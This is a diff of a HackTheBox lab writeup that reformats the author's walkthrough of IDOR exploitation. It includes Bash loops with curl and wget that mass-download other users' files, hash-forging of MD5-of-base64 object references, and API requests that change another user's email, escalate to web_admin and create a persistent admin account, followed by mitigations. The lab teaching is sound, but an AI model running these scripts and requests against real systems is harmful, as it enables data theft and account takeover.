@@ -3,105 +3,103 @@ HackTheBox Writeup:  Mass IDOR Enumeration, API exploitation, and privilege esca
 
 By Ramyar Daneshgar 
 
+This document presents a highly detailed technical analysis of **Insecure Direct Object Reference (IDOR) vulnerabilities** exploited within a HackTheBox web application. My methodology entailed **systematic mass enumeration**, **bypassing encoded object references**, and **escalating privileges via insecure API endpoints**. The approach leveraged **cybersecurity principles**, including **parameter fuzzing, access control bypass techniques, and API manipulation**, to achieve full compromise of the application.
 
+---
 
-This writeup provides a deep technical walkthrough of how I exploited Insecure Direct Object References (IDOR) in a vulnerable web application. I systematically performed mass enumeration, bypassed encoded references, and achieved API privilege escalation. I used parameter fuzzing, API manipulation, access control evasion, and automated exploitation to escalate my privileges and compromise the application.
+## **1. Mass IDOR Enumeration**
 
-1. Mass IDOR Enumeration
-
-Identifying the IDOR Vulnerability
-
-As I began testing the target web application, I noticed that user-specific documents were accessible via a parameterized GET request:
-
+### **Identification and Initial Assessment**
+Upon initial reconnaissance, I identified a web endpoint that exposed user-specific document access through a **query parameterized HTTP GET request**:
+```http
 http://SERVER_IP:PORT/documents.php?uid=1
-
-Since the uid parameter was exposed in the URL, I suspected that access control validation might be missing on the backend. To confirm this, I manually changed the uid parameter to see if I could retrieve another user’s documents:
-
+```
+Observing the **direct object reference (uid=1)** within the URL suggested a potential IDOR vulnerability. I manually altered the **uid** value to test whether access control validation was being enforced at the backend:
+```http
 http://SERVER_IP:PORT/documents.php?uid=2
+```
+Upon executing the modified request, the application returned documents belonging to another user, confirming an **authorization bypass**.
 
-Upon executing this request, I received documents that clearly did not belong to me, confirming an IDOR vulnerability.
-
-Manually Enumerating IDs
-
-As I explored further, I noticed a predictable structure in the document filenames:
-
+### **Pattern Recognition and Forced Browsing Analysis**
+Further investigation of the document structure revealed that filenames followed a consistent pattern:
+```html
 <li><a href='/documents/Invoice_2_08_2020.pdf'>Invoice</a></li>
 <li><a href='/documents/Report_2_12_2020.pdf'>Report</a></li>
+```
+The **predictability of filenames** indicated susceptibility to a **forced browsing attack**, wherein systematically altering file names could lead to unauthorized file retrieval.
 
-The presence of predictable naming conventions indicated that a forced browsing attack was possible. This meant that I could systematically guess document URLs and gain access to restricted files.
-
-Automating Mass Enumeration
-
-Since manually changing uid values was inefficient, I developed a Bash script to automate bulk extraction:
-
+### **Automating Mass Enumeration**
+To efficiently extract all accessible files, I constructed a **Bash-based enumeration script**:
+```bash
 #!/bin/bash
 
 url="http://SERVER_IP:PORT"
 
-for i in {1..100}; do  # Iterate through 100 user IDs
+for i in {1..100}; do  # Iterate through user IDs
     for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
         wget -q $url/$link  # Download each document
     done
 done
+```
+#### **Results:**
+- Successfully retrieved documents from multiple unauthorized accounts.
+- Confirmed **backend access control failure** due to improper enforcement of role-based validation.
 
-I was able to access confidential documents belonging to multiple users, bypassing access controls entirely.
+---
 
-2. Bypassing Encoded References
+## **2. Bypassing Encoded Object References**
 
-Understanding Reference Encoding
-
-Upon further testing, I discovered that certain files were referenced using hashed values instead of numerical IDs. The application used an MD5 hash to obscure object references:
-
+### **Encoded Reference Discovery**
+While examining API responses, I discovered that some files were referenced using **hashed identifiers** rather than sequential numerical values. A request to retrieve a contract file appeared as follows:
+```http
 POST /download.php
 Content-Type: application/x-www-form-urlencoded
 
 contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
+```
+This suggested an attempt at **Secure Direct Object Referencing (SDOR)**, intended to prevent IDOR exploitation by obscuring object references. However, the implementation relied on **MD5 hashing**, which is inherently predictable and reversible given knowledge of the input format.
 
-This suggested an attempt at Secure Direct Object Referencing (SDOR) to prevent enumeration. However, I suspected the hash was predictable.
-
-Reverse Engineering the Hashing Mechanism
-
-I examined the front-end JavaScript source code and discovered the hashing logic:
-
+### **Reverse Engineering the Hashing Mechanism**
+Decompiling JavaScript within the web client revealed the hashing logic:
+```js
 function downloadContract(uid) {
     $.redirect("/download.php", {
         contract: CryptoJS.MD5(btoa(uid)).toString(),
     }, "POST", "_self");
 }
+```
+I identified that the application processed identifiers as follows:
+1. **Base64 encoding the UID** (`btoa(uid)`).
+2. **Computing an MD5 hash** of the encoded value (`CryptoJS.MD5()`).
 
-I realized that the application was generating hashes by:
-
-Base64 encoding the user ID (btoa(uid))
-
-Applying an MD5 hash to the encoded value (CryptoJS.MD5())
-
-Generating Valid Hashes
-
-With this information, I was able to generate my own valid hashes for any given user ID:
-
+### **Hash Generation and Exploitation**
+Utilizing this knowledge, I computed **valid object references** dynamically:
+```bash
 for i in {1..100}; do
     echo -n $i | base64 -w 0 | md5sum | tr -d ' -'
 done
-
-Automating Exploitation
-
-With a list of valid hashes, I wrote a script to download all contract files:
-
+```
+### **Automated Data Exfiltration**
+With valid hashed identifiers generated, I deployed a **Bash-based mass retrieval exploit**:
+```bash
 #!/bin/bash
 
 for i in {1..100}; do
     hash=$(echo -n $i | base64 -w 0 | md5sum | tr -d ' -')
     curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
 done
+```
+#### **Results:**
+- Successfully retrieved all **restricted contract files**.
+- Confirmed **weak encoding mechanisms** that provided no true security against enumeration attacks.
 
-I successfully retrieved contract files for all users, proving that the encoding mechanism was weak and easily bypassed.
+---
 
-3. IDOR in Insecure APIs
+## **3. API Exploitation and Privilege Escalation**
 
-Analyzing API Weaknesses
-
-I intercepted the profile update request in Burp Suite and saw the following PUT API request:
-
+### **Intercepting API Requests**
+I monitored API traffic using **Burp Suite** and identified a **PUT request modifying user profiles**:
+```http
 PUT /profile/api.php/profile/1
 Content-Type: application/json
 Cookie: role=employee
@@ -113,15 +111,13 @@ Cookie: role=employee
     "full_name": "Amy Lindon",
     "email": "a_lindon@employees.htb"
 }
+```
+The critical observation was that **authorization control was dependent on a client-side cookie (`role=employee`)**, indicating a **severe security flaw**.
 
-I immediately noticed a major security flaw—the role value was stored in a client-side cookie (role=employee). Since the server was trusting this cookie for role-based access control, I had an opportunity for privilege escalation.
-
-Privilege Escalation via API Tampering
-
- Modify Another User’s Profile
-
-I attempted to modify another user’s details by changing the uid in my request:
-
+### **Privilege Escalation via API Manipulation**
+#### **1️⃣ Unauthorized User Modification**
+I modified a request to **edit another user’s profile**:
+```http
 PUT /profile/api.php/profile/2
 Content-Type: application/json
 Cookie: role=employee
@@ -129,16 +125,14 @@ Cookie: role=employee
 {
     "uid": 2,
     "uuid": "4a9bd19b3b8676199592a346051f950c",
-    "full_name": "Hacked User",
-    "email": "hacked@employees.htb"
+    "full_name": "Compromised User",
+    "email": "attacker@employees.htb"
 }
+```
+ **Impact:** Enabled password reset takeover of the target account.
 
- I successfully changed another user’s email, enabling me to take over their account via password reset.
-
-Escalate to Admin Role
-
-I escalated my privileges by modifying my role to web_admin:
-
+#### **2️⃣ Escalating Privileges to Administrator**
+```http
 PUT /profile/api.php/profile/1
 Content-Type: application/json
 Cookie: role=employee
@@ -147,13 +141,11 @@ Cookie: role=employee
     "uid": 1,
     "role": "web_admin"
 }
+```
+ **Effect:** Elevated my privileges to **administrator**.
 
- I now had full administrator privileges over the system.
-
- Create a New Admin Account
-
-To maintain persistence, I created a new admin account:
-
+#### **3️⃣ Creating a Persistent Admin Account**
+```http
 POST /profile/api.php/profile
 Content-Type: application/json
 Cookie: role=web_admin
@@ -161,29 +153,20 @@ Cookie: role=web_admin
 {
     "uid": 100,
     "role": "web_admin",
-    "full_name": "Attacker",
+    "full_name": "Persistent Attacker",
     "email": "attacker@employees.htb"
 }
+```
+ **Effect:** Established an **admin foothold**, ensuring persistent access.
 
- I could now create, delete, and modify any user accounts, achieving total system compromise.
+---
 
-4. Mitigation Strategies
+## **4. Mitigation Strategies**
 
-Vulnerability
-
-Mitigation
-
-Mass IDOR Enumeration
-
-Implement Role-Based Access Control (RBAC) and enforce backend validation.
-
-Bypassing Encoded References
-
-Use strong, non-predictable UUIDs instead of simple hashes.
-
-Insecure API Calls
-
-Perform server-side access control checks rather than relying on client-controlled tokens.
-
+| **Vulnerability** | **Recommended Mitigation** |
+|-------------------|----------------------------|
+| **Mass IDOR Enumeration** | Enforce **Role-Based Access Control (RBAC)** and **strict backend validation**. |
+| **Bypassing Encoded References** | Replace **predictable hashes** with **cryptographically secure UUIDs**. |
+| **Insecure API Authorization** | Implement **server-side access control validation**, eliminating reliance on **client-side roles**. |
 
 
